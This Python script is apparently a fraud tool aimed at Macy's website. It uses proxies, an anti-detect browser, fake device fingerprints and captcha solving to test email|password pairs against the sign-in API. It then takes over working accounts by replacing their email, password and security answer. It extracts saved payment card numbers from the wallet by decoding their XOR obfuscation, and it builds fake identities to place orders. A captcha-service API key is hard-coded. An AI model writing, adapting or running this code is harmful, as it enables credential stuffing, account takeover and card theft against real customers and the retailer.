#!/usr/bin/python
# -*- coding: utf-8 -*-   
# -*- coding: latin-1 -*-
import re, random;
import sys, time;
import json, base64
from urllib.parse import unquote, quote, urlencode
import os, mybrowser, munantiapi

from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
class FinalForm:
    """ Final form of registration
    """
    form = "form";
    html = "source code";
    captchaControlName = None;
    questionControlName = None;
    captchaImage = None;
    captchaResult = None;
    keyantigate = None;
    questionString = None;
    questionResult = None;
    listLink = None;

    def __init__(self, form, html):
        self.form = form;
        self.html = html;


class Macys:
    """ Test reg forum
    """


    def __init__(self, mun_browser=None, driver=None, orderfinalForm=[], updatestatus='update',captcha_queue=None, mobile=False, antidetectQueQue=None, statusqueue=None):
        self.updatestatus = updatestatus
        self.orderfinalForm = orderfinalForm;

        # ua.set_debug_responses(False)
        self.captcha_queue = captcha_queue;
        self.statusqueue = statusqueue
        self.mun_browser  = mun_browser
        self.driver = driver
        self.browser = mybrowser.Rqbrowser()
        
        self.decaptcha_key = 'aa15c055da98e4867e9c924dce54f1e2'
        self.mun_api = munantiapi.MunAntiApi()
        self.mobile = mobile
        self.phoneApi = None
        # self.browser.link_host = 'www.macys.com'
        # self.browser.link_origin = 'https://www.macys.com'


    def mun_anti_get_cookies(self,sock5='', proxy=''):
        self.munAnti = MunAntiBrowser()
        self.driver = self.munAnti.open_random_driver(sock5=sock5, proxy=proxy, pageLoad=False, phoneOs='Android')
        # inject_data = self.munAnti.get_inject_data()
        # print(profile_info)
        # self.driver = self.munAnti.setting(inject_str=inject_data,
        #                     profileInfo=profile_info, onetime=True,fake_finger=False, pageLoad=False)
        self.driver.get('https://www.macys.com/account/signin')
        element = WebDriverWait(self.driver, 60).until(
            EC.visibility_of_element_located((By.ID, "email"))
        )
        
        list_cookies = self.munAnti.get_cookies()
        extra_cookies = {}
        for line_cookies in list_cookies:
            if line_cookies['domain'].find('macys.com') != -1:
                extra_cookies[line_cookies['name']] = line_cookies['value']
        self.munAnti.close_browser()
        return extra_cookies
        # pickle.dump( self.driver.get_cookies() , open("cookies.pkl","wb"))
    def check_by_mun_anti(self,email,password):
        self.munAnti = MunAntiBrowser()
        profile_info = self.munAnti.create_random_profile()
        inject_data = self.munAnti.get_inject_data()
        # print(profile_info)
        self.driver = self.munAnti.setting(inject_str=inject_data,
                            profileInfo=profile_info, onetime=True)     
         
        self.driver.implicitly_wait(20)
    
    def login(self, email,password):
        print('==login==')
        self.driver.get('https://www.macys.com/account/signin') 
        
        email_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH ,"//input[@id='email']"))) 
        
        password_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH ,"//input[@id='pw-input']"))) 
        
        signIn_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH ,"//input[@id='sign-in']"))) 
        
        signInStay_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH ,"//input[@id='stay-signedin']")))
        
        self.driver.implicitly_wait(2)
        
        self.mun_browser.send_keys_like_human(email_present, email )
        
        self.mun_browser.send_keys_like_human(password_present, password )
        
        self.mun_browser.click_random_offset_element(signIn_present) 
        
        
        # self.driver.get('https://www.macys.com/account/wallet?cm_sp=mew_navigation-_-menu-_-wallet&lid=glbhdrnav_wallet-us') 
    
    def site_login(self,email,password, sock5='', proxy=''):

        self.update_status('Trying Login to Your account:' + email + '|' + password)
        self.browser.open('https://www.macys.com/account/signin')
        extraHeader = {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
  }
        self.browser.add_header('https://www.macys.com/account/signin',extraHeader=extraHeader, XMLHttpRequest=True)
        i = 0
        while i < 4:
            try:
                r = self.browser.open(
                    'https://www.macys.com/account-xapi/api/account/signin?lid=sign_in&cm_sp=macys_account-_-macys_credit_card-_-sign_in')
                html = r.text
                result_auth = r.json()
                list_cookies = result_auth['user']['cookies']
                extra_cookies = {}
                for line_cookies in list_cookies:
                    extra_cookies[line_cookies['name']] = line_cookies['value']
                print(extra_cookies)
                self.browser.add_cookies(extra_cookies)
            except:
                pass
            else:
                break

            # print(html)

            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'check die:socks die:'

        auth2_key_re = re.search('authwebKey":"(.+?)"',html)
        if auth2_key_re:
            auth2_key = auth2_key_re.group(1).strip()
        else:
            auth2_key = re.search('oauth2_authorization_key" : "(.+?)"',html).group(1).strip()
        self.update_status('oauth2_authorization_key:' + unquote(auth2_key))

        extraHeader = {
            "Accept": "application/json",
            "Accept-language": "en-US,en;q=0.9;q=0.8,zh;q=0.7,q=0.6",
            "Authorization": "Basic " + unquote(auth2_key),
            "Cache-control": "no-cache",
            "Content-type": "application/x-www-form-urlencoded",
            "otp": "",
            "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site"
            }
        
        extra_cookies = self.mun_anti_get_cookies(sock5=sock5,proxy=proxy)
        self.browser.add_cookies(extra_cookies)
        
        self.browser.add_header(
            'https://www.macys.com/account/signin', extraHeader=extraHeader, XMLHttpRequest=True)
        cookiesRaw = self.browser.add_cookies_to_header()
        print(cookiesRaw)
        i = 0
        while i < 4:
            try:
                request_url = 'https://auth.macys.com/v3/oauth2/token'
                data={}
                data['grant_type'] = 'password'
                data['username'] = email.strip()
                data['password'] = password.strip()
                data['registrySignIn'] = 'false'
                data['request_url'] = 'https://www.macys.com/account/signin'
                data['deviceFingerPrint'] = ''
                data['authWebKey'] = unquote(auth2_key)
                r = self.browser.open(request_url, data=data, timeout=30)
                html = r.text
                # print(html)
            except:
                pass
            else:
                break

            print(html)

            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'check die:socks die:'
        print(html)
        if html.find('access_token":') != -1:
            return email +'|'+ password
        else:
            return 'check die: Your password incorect'


    def change_email_info(self):
        self.browser.add_header('https://www.macys.com/account/profile?cm_sp=macys_account-_-my_account-_-my_profile')
        i = 0
        while i < 4:
            try:
                r = self.browser.open('https://www.macys.com/account/profile?cm_sp=macys_account-_-my_account-_-my_profile',timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()
                html = self.browser.fixHTML(html)
                self.browser.add_header(link_get, XMLHttpRequest=True)
                formorders = self.browser.get_forms()
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:'
        checkform = None
        for form in formorders:
            print(form)
            if str(form).find('TextControl(profile.email') != -1:
                checkform = form
                break
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 16
        stringimg = ''
        list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                       'yahoo.com', 'aol.com', 'live.com']
        mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        username_chuan = stringimg
        # # print checkout_form
        self.email_chuan = username_chuan + '@' + mail_domain
        password_chuan = stringimg
        self.update_status('Trying Change email:' + self.email_chuan+'|'+password_chuan)

        self.update_status(self.email_chuan+'|'+password_chuan)
        checkform['profile.email'].value = self.email_chuan
        checkform['profile.confirmEmail'] = self.email_chuan
        checkform['profile.securityQuestion'] = ['6']
        checkform['profile.profileAddress.firstName'] = self.bfirstname
        checkform['profile.profileAddress.lastName'] = self.blastname
        checkform['profile.profileAddress.address.addressLine1'] = self.baddress1
        checkform['profile.profileAddress.address.addressLine2'] = self.baddress2
        checkform['profile.profileAddress.address.city'] = self.bcity
        checkform['profile.profileAddress.address.state'] = [self.bstate]
        checkform['profile.profileAddress.address.postalCode'] = self.bzipcode
        checkform['profile.securityAnswer'] = 'bull'
        checkform['profile.password'] = password_chuan
        checkform['profile.confirmPassword'] = password_chuan

        if checkform['profile.gender'][0] == -1:
            # print 'aaaaaaa'
            checkform['profile.gender']=['F']
        if checkform['profile.year'][0] ==  -1:
            checkform['profile.date'] = ['1']
            checkform['profile.month'] = ['01']
            checkform['profile.year'] = ['1980']

        request = checkform.click('processProfile')
        # print checkform
        i = 0
        while i < 4:
            try:
                r = self.browser.open(request,timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()
                html = self.browser.fixHTML(html)
                self.browser.add_header(link_get, XMLHttpRequest=True)
                # formorders = self.browser.selectForm(html, link_get)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:'
        c = open('dien.html','w')
        c.write(html)


        if html.find('Your changes have been saved') != -1 or html.find('globalMessages"') == -1:
            self.email = self.email_chuan
            self.password = password_chuan
            return self.email_chuan
        else:

            self.update_status('Cant Change email:' + self.email)
            return self.email
        # c = open('dien.html','w')
        # c.write(html)

    def get_billing_and_macys_id(self, html, get_all_card=False):
        # c = open('test.html','w')
        # c.write(html)
        macys_cards = re.search('"tenders":\[(.+?)\}\]', html)
        if not macys_cards:
            return
        try:
            # print '=========='
            # print macys_cards.group(1)
            list_macys = json.loads('[' + macys_cards.group(1) + '}]')
        except:
            list_macys = []
            # c = open('dienjon.html','w')
        # c.write(html)
        list_macys_id = []
        for line_macys in list_macys:
            # print '---------------'
            # print line_macys
            cardId = None
            macys_info = None
            if get_all_card:
                try:
                    self.baddress2 = line_macys['billingAddress']['line2']
                except:
                    self.baddress2 = ''
                macys_info = line_macys['billingAddress']['firstName'] + '|' + line_macys['billingAddress'][
                'lastName'] + '|' + line_macys['billingAddress']['line1'] + '|' + \
                         self.baddress2 + '|' + line_macys['billingAddress'][
                             'city'] + '|' + line_macys['billingAddress']['state'] + '|' + \
                         line_macys['billingAddress']['zipCode'] + '|' + line_macys['cardNickName']#+'|'+line_macys['cardNumber']+'|'+str(line_macys['expMonth'])+'|'+str(line_macys['expYear'])
                self.bfirstname = line_macys['billingAddress']['firstName']
                self.blastname = line_macys['billingAddress']['lastName']
                self.baddress1 = line_macys['billingAddress']['line1']

                self.bcity = line_macys['billingAddress']['city']
                self.bstate = line_macys['billingAddress']['state']
                self.bzipcode = line_macys['billingAddress']['zipCode']
                cardId = str(line_macys['cardId'])
                cardNumber = str(line_macys['cardNumber'])

            else:
                # print line_macys['expYear']
                if line_macys['cardNickName'].find('Macy') != -1:
                    try:
                        self.baddress2 = line_macys['billingAddress']['line2']
                    except:
                        self.baddress2 = ''
                    macys_info = line_macys['billingAddress']['firstName'] + '|' + line_macys['billingAddress'][
                    'lastName'] + '|' + line_macys['billingAddress']['line1'] + '|' + \
                             self.baddress2 + '|' + line_macys['billingAddress'][
                                 'city'] + '|' + line_macys['billingAddress']['state'] + '|' + \
                             line_macys['billingAddress']['zipCode'] + '|' + line_macys['cardNickName']#+'|'+line_macys['cardNumber']+'|'+str(line_macys['expMonth'])+'|'+str(line_macys['expYear'])
                    self.bfirstname = line_macys['billingAddress']['firstName']
                    self.blastname = line_macys['billingAddress']['lastName']
                    self.baddress1 = line_macys['billingAddress']['line1']

                    self.bcity = line_macys['billingAddress']['city']
                    self.bstate = line_macys['billingAddress']['state']
                    self.bzipcode = line_macys['billingAddress']['zipCode']
                    cardId = str(line_macys['cardId'])
                    cardNumber = str(line_macys['cardNumber'])

            if cardId:
                self.update_status('get card infomation')
                macys_card = self.get_macys_card_info(cardId,get_all=get_all_card)
                if not macys_card:
                    macys_card = cardNumber
                if macys_card.find('socks die') != -1:
                    return 'order die:socks die'
                if macys_card and cardId:
                    list_macys_id.append({'billingAddress': macys_info,
                                          'card_infomation': str(macys_card) + '|' + str(line_macys['expMonth']) + '|' + str(
                                              line_macys['expYear']),
                                          'cardId':cardId
                    })
        return list_macys_id

    def get_macys_card_info(self, macys_id,get_all=False):
        # print macys_id
        self.browser.link_host = 'www.macys.com'

        self.browser.add_header('https://www.macys.com/account/wallet')

        data={}
        data['creditCard.creditCardID'] = macys_id
        data['userAction'] = 'EDIT'
        data['validationCheck'] = 'false'
        card_chuan = None

        self.browser.open('https://www.macys.com/account/wallet', data=data)
        html = self.browser.read()
        html = self.browser.fixHTML(html)
        w = open('dien','w')
        w.write(html)
        base64_strings = re.search('value="\{xor\}(.+?)"', html)
        if base64_strings:
            card_base64string = base64.b64decode(base64_strings.group(1).strip()).decode('utf-8')
            print(card_base64string)
            card_chuan = ''.join([chr(ord(x) ^ ord('_')) for x in str(card_base64string)])

        return card_chuan

    def send_message(self, message, to_user=None):
        """Send message to user
        @param message
        @param to_user user nick name, default is self.nicknamerequest
        @return
        """
        if not to_user:
            to_user = 'ruandejun';
        try:
            f = open('temp_data_chat2.txt', 'a')
            f.write('\n' + to_user + '|:|[+]' + message);
            f.plush()
            f.close()
        except:
            pass
        return

    def update_status(self, status):
        print(status)
        if self.emit:
            try:
                self.emit(self.qtcode.SIGNAL(self.updatestatus + '(QString,QString)'), "updatestatus", str(status))
            except:
                pass


    def get_billing_infomation(self, listbilling):
        hangbill = listbilling.split('|')
        self.bfirstname = hangbill[0].strip()
        self.blastname = hangbill[1].strip()
        self.baddress1 = hangbill[2].strip()
        self.baddress2 = hangbill[3].strip()
        self.bcity = hangbill[4].strip()
        self.bstate = hangbill[5].strip()
        self.bzipcode = hangbill[6].strip()


    #################################
    def get_shipping_infomation(self, shipping_address):
        if shipping_address.find('|') != -1:
            hangdrop = shipping_address.split('|')
            self.sfirstname = hangdrop[0].strip()
            self.slastname = hangdrop[1].strip()
            self.saddress1 = hangdrop[2].strip()
            self.saddress2 = hangdrop[3].strip()
            self.scity = hangdrop[4].strip()
            self.sstate = hangdrop[5].strip().upper()
            self.szipcode = hangdrop[6].strip()
            if self.szipcode.find('-') != -1:
                self.szipcode = self.szipcode.split('-')[0].strip()
            THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
            my_file = os.path.join(THIS_FOLDER, 'us_phone.db')
            sphoneopen = open(my_file)
            listsphone = sphoneopen.read()
            list_phone = listsphone.split('\n')
            min = 0
            max = len(list_phone) - 1
            ran_phone = random.randint(min, max)
            dau = 1000000
            cuoi = 9999999
            phone_them = random.randint(dau, cuoi)
            self.sphone = list_phone[ran_phone].strip().split('|')[0].strip() + str(phone_them)


            self.sphone1 = self.sphone[:3]
            self.sphone2 = self.sphone[3:6]
            self.sphone3 = self.sphone[6:]
            alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
            min = 8
            max = 16
            stringimg = ''
            list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                           'yahoo.com', 'aol.com', 'live.com']
            mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
            for x in random.sample(alphabet, random.randint(min, max)):
                stringimg += x
            username_chuan = stringimg
            # print checkout_form
            self.email_chuan = username_chuan + '@' + mail_domain
            return True

    def get_card_infomation(self, list_card):
        hangcard = list_card.split('|')
        self.ccnum = hangcard[0].strip()
        self.ccmonth = hangcard[1].strip()
        self.ccyear = hangcard[2].strip()
        self.ccv = hangcard[3].strip()

    def check_item_information(self,item_information):
        if item_information.find('|') != -1 and item_information.split('|')[3].isdigit() and len(
                item_information) >= 4:

            return item_information

        elif item_information.find('|') == -1:

            return item_information + '|||1'

    def get_item_information(self, item_information):
        #tem_id_link + '|' + size + '|' + color + '|' + quantity
        self.list_item_link = []
        if item_information.find('http') != -1:
            if item_information.find('&&') != -1 and item_information.find('|') != -1:
                for line_item_information in item_information.split('&&'):
                    # print(line_item_information)
                    item_info = self.check_item_information(line_item_information)
                    if item_info:
                        # print(item_info)
                        self.list_item_link.append(item_info)
            else:
                item_info = self.check_item_information(item_information)
                if item_info:
                    self.list_item_link.append(item_info)
        self.update_status('Total Item:'+str(len(self.list_item_link)))
        return self.list_item_link

    def fake_device(self):
        lineid = 'AY1YRP7DGIANf94lis1ztjbaCjtwdIzBeIjcMsiKoV3ongzw3wHC5NdsLgfbzWczCZXSNrNV4WV1SymuXlKryeXc4KIy3xRrzWYTHlPicx7ZXww/iHYkpLUNV2Q29sXkDPWCyXC02/owt6O60biHEvCETHjLCHPGKA75SqnFv74B84+POrI4Ms328hjC+34K05Q/wCFac7P3EQQB8QcgtgILwWcJ99KasBYthNfc2naB+G4cgo25NTPWZ1WdKay3a0Yy5JnHYpPXxxc1Gndhig5752W+wI+0j4dNymmA3+ReKjeYpUo22DY5OJinr+4yVYyRYwbH47B3xBfNPgHEB9/KUsiAoCUdJndkm9obPrIrSGWIUPQA6WWvVpW54irpJaLUYIygQGWLqCpize7FnDzD+pz2kJ1NMGfGDfMJjL129+0hEjKPjP1vtrI+sw/YA6p8HhqE+ey5mZwvTfjFexJINjA4D1eFt/EuOIYq5+LmkMc2TMvZsg1/InDlj2XM+3Arp0EvTCs5VU/JDhXWhJxWd7eAwDFq5PT2+0lse102wyKa9hLJKAHzj486sjgyzfbyGML7fgp/YHhOm/RN9L9MOnRTMthLPat9pzJYe9IstDDhGcf4uyDMnwUlr/77l1ahRLPHCJ3GLZFe836qdMz9eZyIpiELKTufJ5uIS1Lg4ZtzHoaOPmREhSz9IVxdTHvdQiTWuc8QEaPLnIBsrtBNHddbMaRvKl21bKBPjS9GASpJ6ETmLbtOxKYkBFXNCg+O9YxO2R4GpUeravdrC0mIMv2lo07LAeaxrJT0hKVYsAzjt8deBTRp2t4FesanpudmGgePEndCIHeoMbxIFKT3RLm97GYGDKrGRQg5YWn2zaDmpJI3LIJm+6/numkJUgwhBopitX4FSR5JlWxgsoIwJJzZq4PPkhRsS5OE0AQEMv5tsr1ng0IBw1my45n+U7cmEOu0Igg3BrK+mCzeIgPac+jimfkz0FxuPiCSbSa7s7Qi+tyKrHA+k9XRlIy/rtS5ttueQzuSNnnoqi4waFkSvsPLBjkjrs0k7XSUe+mYt0hT/uKRQFJGbs2QmkP1'

        liststring = lineid.split('+')
        alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        # 04003hQUMXGB0poNf94lis1ztu5Divh068bweIjcMsiKoV3ongzw3wHC5I6rPU1RSbUiqTMoMwiMGdwJldI2s1XhZXVLKa5eUqvJ5dzgojLfFGvNZhMeU+JzHjuR7iCGj69zmAC0AP0RCF4M9YLJcLTb
        randomint = random.randint(0, 99)
        if randomint < 10:
            themstr = '0' + str(randomint)
        else:
            themstr = str(randomint)
        # string_id = '0400' + themstr
        string_id = '0400' + themstr
        a = 0
        while a < len(liststring):
            line_s = liststring[a]
            stringimg = ''
            if line_s.find('/') != -1:
                listline = line_s.split('/')
                for lineb in listline:
                    stringb = ''
                    i = 0
                    while i < len(lineb):
                        randomint = random.randint(0, len(alphabet))
                        stringb += alphabet[randomint - 1:randomint]
                        i += 1
                    if not stringimg:
                        stringimg = stringimg + stringb
                    else:
                        stringimg = stringimg + '/' + stringb
            else:
                i = 0
                while i < len(line_s):
                    randomint = random.randint(0, len(alphabet))
                    stringimg += alphabet[randomint - 1:randomint]
                    i += 1
            if a == 0:
                string_id = string_id + stringimg
            else:
                string_id = string_id + '+' + stringimg
            a += 1
        return string_id + '='

    def add_item_to_cart(self, item_link, size, color, quantity):
        self.browser.link_host = 'www.macys.com'
        self.browser.link_origin = 'http://www.macys.com'
        self.browser.add_header('http://www.macys.com')
        self.update_status('Trying Connect To Macys:' + item_link)
        i = 0
        while i <= 4:
            try:
                r = self.browser.open(item_link,timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()
                html = self.browser.fixHTML(html);
                self.browser.add_header(link_get, XMLHttpRequest=True,extraHeader={'Content-Type':'application/x-www-form-urlencoded'})
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:';

        self.update_status('trying get productid')
        upcmap_re = re.search('upcMap": (.+?),\s*"sizeChart"', html, re.DOTALL)
        if not upcmap_re:
            upcid_re = re.search('upcID": (.+?),',html)
            if upcid_re:
                upcId = upcid_re.group(1).strip()

            else:

                self.update_status('Cant find upcMap')
                error_w = open('error.html', 'w')
                error_w.write(html)
                return 'order die:Cant find upcMap';
        if upcmap_re:
            upcmap = eval(upcmap_re.group(1).strip());

            upcId = None
            item_size = None
            item_color = None
            for ups in upcmap:

                item_color = upcmap[ups].get('color').strip()
                try:
                    item_size = upcmap[ups].get('size').strip()
                except:
                    pass
                if re.search('No Color', item_color, re.IGNORECASE) or item_color == None:

                    self.update_status('no color:' + item_color)
                    upcId = upcmap[ups].get('upcID')
                if not size:
                    ## so sanh color
                    if re.search(color, item_color.strip(), re.IGNORECASE) and len(color) == len(item_color.strip()):
                        self.update_status('color:' + item_color)

                        upcId = upcmap[ups].get('upcID')
                        break
                else:
                    if item_size:
                        ##so sanh color + size
                        if color:
                            if re.search(color, item_color.strip(), re.IGNORECASE) and len(color) == len(
                                    item_color.strip()) and size == item_size:

                                self.update_status('color:' + item_color)
                                self.update_status('size:' + item_size)
                                upcId = upcmap[ups].get('upcID')
                                break
                        else:
                            if size == item_size:
                                self.update_status('size:' + item_size)
                                upcId = upcmap[ups].get('upcID')
                                break

            if not upcId and len(upcmap) <= 1:
                try:
                    upcId = upcmap[upcmap.keys()[0]].get('upcID')
                except:
                    self.update_status('This product is currently unavailable')
                    return 'order die:This product is currently unavailable'
            elif not upcId:
                self.update_status('Cant Find Your Color')
                return 'order die:Cant Find Your Color'

        request_url = 'https://www.macys.com/bag/add'
        recatagoryId = re.search('categoryId": "(.+?)"', html)

        request_data = {}
        request_data['upcId["' + str(upcId) + '"]'] = quantity
        request_data['prodSelectionInfo'] = 'cmexplore'
        request_data['source'] = 'PDPA2B'
        request_data['bagContents'] = ''

        request_data['categoryId'] = recatagoryId.group(1).strip()

        request_data['trackingCategory'] = 'onsite_search'
            # if email_gift:
        # request_data['giftCardAmount'] = color
        #	request_data['giftCardEmail'] = email_gift
        #	request_data['giftUPCID'] = str(upcId)
        # url_values = urlencode(request_data)
        #url_values = '{"additemsrequest":{"quantity":1,"upcid":32443636,"trackingInfo":"cmexploree","trackingCategory":"onsite_search","showBag":true}}'

        self.update_status('Trying Add To Cart')
        i = 0
        while i <= 4:
            try:

                self.browser.link_host = 'www.macys.com'
                self.browser.link_origin = 'https://www.macys.com'
                extraHeader = {
                    # 'Cache-Control': 'no-cache',
                    # 'Pragma': 'no-cache',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Connection': 'keep-alive',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
                self.browser.add_header(item_link, XMLHttpRequest=True, extraHeader=extraHeader)
                #time.sleep(3)
                r = self.browser.open(request_url, data=request_data,timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()
                html = self.browser.fixHTML(html);
                self.browser.add_header(link_get)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:';
        self.update_status('Trying Go To Your Bag')

        if html.find('In Stock') == -1 and html.find('autoAddChoice":"ADD"') == -1:
            error_w = open('error.html', 'w')
            error_w.write(html)

            self.update_status('Cant Checkout')
            return 'order die:Cant Checkout';
        else:
            self.update_status('Added your item')
            return 'Added your item'

    def create_account(self):

        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 16
        stringimg = ''
        list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                       'yahoo.com', 'aol.com', 'live.com']
        mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        self.password = stringimg
        month=str(random.randint(1, 12))
        if len(month) == 1:
            month = '0'+month
        self.update_status('Trying Go To Create account')
        ##link host
        self.browser.link_host = 'secure-m.macys.com'

        dateOfBirth = '%s-%s-%s' % (random.randint(1960, 1990),random.randint(1, 12),random.randint(1, 30))
        data = {"user":{
            "dateOfBirth":dateOfBirth,
            "profileAddress":{"firstName":self.sfirstname,
                              "lastName":self.slastname,
                              "email":self.email_chuan,
                              "bestPhone":""
                              },
            "loginCredentials":{"password":self.password},
            "subscriptions":[{"id":"1","name":"Thisit Email Newsletter ","value":"Y","active":"true","acquisitionSource":"Macys","preferenceId":"761d292e-fde3-11e6-bc64-92361f002671"},{"id":"4","name":"Mobile Phone Marketing Preference","value":"N","active":"false","preferenceId":"41ad6cd0-f9fb-11e6-bc64-92361f002671"},{"id":"31","name":"Security SMS","preferenceId":"2a6609c8-2922-11e7-93ae-92361f002671","value":'null',"active":"false","acquisitionSource":"Macys"}]}
        }
        # c = open('dien1.html','w')
        # c.write(html)
        self.update_status('Trying Create account:'+self.email_chuan+'|'+stringimg)
        self.browser.add_header('https://secure-m.macys.com/account/profile', XMLHttpRequest=True, extraHeader={'Accept':'application/json, text/javascript, */*; q=0.01','Content-Type':'application/json','Accept-Encoding':'gzip, deflate, br'})


        request_url = 'https://secure-m.macys.com/api/v1/user/profile'
        # request_data = {}
        # request_data['profile.profileAddress.firstName'] = self.sfirstname
        # request_data['profile.profileAddress.lastName'] = self.slastname
        # request_data['profile.email'] = self.email_chuan
        # request_data['profile.password'] = self.password
        # request_data['profile.month'] = month
        # request_data['profile.date'] = str(random.randint(1, 30))
        # request_data['profile.year'] = str(random.randint(1960, 1990))
        # request_data['profile.subscriptionInfo.emailSalesEvents'] = 'true'
        # request_data['profile.subscriptionInfo.subscriptionContactNumber'] = ''
        # request_data['_profile.subscriptionInfo.securityAlerts'] = 'on'
        # request_data['_profile.subscriptionInfo.emailSalesEvents'] = 'on'
        # request_data['_profile.subscriptionInfo.textMessages'] = 'on'
        # request_data['createProfile'] = ''
        i = 0
        while i <= 4:
            try:
                self.browser.open(request_url, json_data=data, timeout=30)
                html = self.browser.read()
            except Exception as e:
                self.update_status(str(e))
                time.sleep(0.5)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:';


        if html.find('Profile created successfully') != -1:
            self.email = self.email_chuan
            return self.email_chuan+'|'+self.password
        else:
            # w = open('error.html','w', encoding='utf-8')
            # w.write(html)
            self.update_status('Cant Create your account')
            return 'order die:Cant Create your account'

    def go_to_input_shipping(self):
        ##########################check out
        self.update_status('Trying Go To Your Bag')
        self.browser.link_host = 'www.macys.com'
        i = 0
        while i <= 4:
            try:
                self.browser.open('https://www.macys.com/bag/index.ognc?cm_sp=navigation-_-top_nav-_-bag',timeout=10)
                html = self.browser.read()
                link_get = self.browser.get_url()
                self.browser.add_header(link_get)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:';
        # c = open('dien1.html','w', encoding='utf-8')
        # c.write(html)

        self.update_status('Trying Go To Shipping Form')

        i = 0
        while i <= 4:
            try:
                if not self.guest_checkout:
                    r = self.browser.open('https://www.macys.com/chkout/startcheckout',timeout=10)
                else:
                    r = self.browser.open('https://www.macys.com/chkout/rcsignedin?perfectProxy=true', timeout=10)
                html = self.browser.read()
                link_get = self.browser.get_url()
                self.browser.add_header(link_get)
            except Exception as e:
                self.update_status(str(e))
                time.sleep(0.5)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:'

        if html.find('shipments[0].shippingAddress.address.state') != -1:
            self.update_status('Went to shipping input form')
            return 'Went to shipping input form'

    def clear_shopping_bag(self):


        self.browser.add_header('http://www.macys.com/', XMLHttpRequest=False)
        # print 'Trying Remove item in Shopping bag'
        self.update_status('Trying Remove item in Shopping bag')
        i = 0
        while i < 4:
            try:
                r = self.browser.open('http://www.macys.com/bag/index.ognc?cm_sp=navigation-_-top_nav-_-bag',timeout=10)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:';
        html = self.browser.read()
        link_get = self.browser.get_url()
        html = self.browser.fixHTML(html);
        #print html
        # self.write_test(html)
        self.browser.add_header(link_get, XMLHttpRequest=True)

        item_bag_list = re.findall(r'id="moveto_wishlist_(.+?)">Move to list',html)
        for item_bag in item_bag_list:
            if item_bag.find('_') != -1:
                #36162400_4_1
                rm_upcId = item_bag.split('_')[0].strip()
                rm_sequenceNumber = item_bag.split('_')[1].strip()
                rm_quantity = item_bag.split('_')[2].strip()
                request_url = 'http://www.macys.com/bag/remove?source=SBDB'
                request_data = {}
                request_data['upcId[0]']=rm_upcId
                request_data['sequenceNumber[0]']=rm_sequenceNumber
                request_data['quantity[0]']=rm_quantity
                request_data['gwpIndicator[0]']='false'
                i = 0
                while i < 4:
                    try:
                        r = self.browser.open(request_url, data=request_data,timeout=10)
                    except:
                        time.sleep(1)
                    else:
                        break
                    i += 1
